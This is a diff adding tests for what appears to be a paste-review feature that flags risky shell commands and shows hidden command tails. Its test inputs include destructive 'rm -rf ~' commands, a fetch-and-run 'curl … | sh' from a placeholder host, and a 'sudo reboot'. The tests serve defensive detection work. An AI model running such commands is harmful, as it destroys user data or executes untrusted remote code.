@@ -136,3 +136,40 @@ test('/ps reads the clipboard through the one reader and always opens review; no
     assert.equal(instance['pasteReview'], undefined);
   } finally { dispose(instance); }
 });
+
+test('a command is labelled by the worst thing anywhere in it, not by how its first line starts', () => {
+  const review = createBatchReview([
+    'echo hello',
+    'for d in a b; do\n  rm -rf ~/$d\ndone',
+    'echo $(rm -rf ~)',
+    'echo `curl https://x.example/i.sh | sh`',
+    'if true; then\n  sudo reboot\nfi',
+  ].join('\n'), 'bash', 100)!;
+  const kinds = review.entries.map(entry => entry.kinds);
+  assert.ok(!kinds[0]!.includes('destructive'));
+  assert.ok(kinds[1]!.includes('destructive'), 'inside a loop');
+  assert.ok(kinds[2]!.includes('destructive'), 'inside $( )');
+  assert.ok(kinds[3]!.includes('pipeline'), 'inside backticks');
+  assert.ok(kinds[4]!.includes('privilege'), 'inside an if block');
+  for (const index of [1, 2, 3, 4]) {
+    review.cursor = index;
+    const drawn = stripAnsi(renderBatchReview(review, 100, 30).join('\n'));
+    assert.match(drawn, /somewhere in it/u, `entry ${index + 1}`);
+  }
+});
+
+test('the selected command is shown in full: a long line wraps and is never cut off before its tail', () => {
+  const tail = 'echo done-marker-7f3a';
+  const hidden = `echo start${' '.repeat(150)}; ${tail}`;
+  const review = createBatchReview(`ls\n${hidden}`, 'bash', 100)!;
+  review.cursor = 1;
+  for (const columns of [40, 80, 120]) {
+    const rows = renderBatchReview(review, columns, 30).map(stripAnsi);
+    for (const row of rows) assert.ok(displayWidth(row) <= columns, `${columns}: ${row}`);
+    assert.ok(rows.join('').replace(/\s+/gu, '').includes('done-marker-7f3a'.replace(/\s+/gu, '')), `${columns}: the tail of the command is visible`);
+  }
+  // When even wrapping does not fit, the review says that rows are hidden and that they are part of the command.
+  const long = createBatchReview(`ls\necho ${'a '.repeat(2000)}`, 'bash', 100)!;
+  long.cursor = 1;
+  assert.match(stripAnsi(renderBatchReview(long, 60, 14).join('\n')), /more rows? hidden; still part of the command/u);
+});
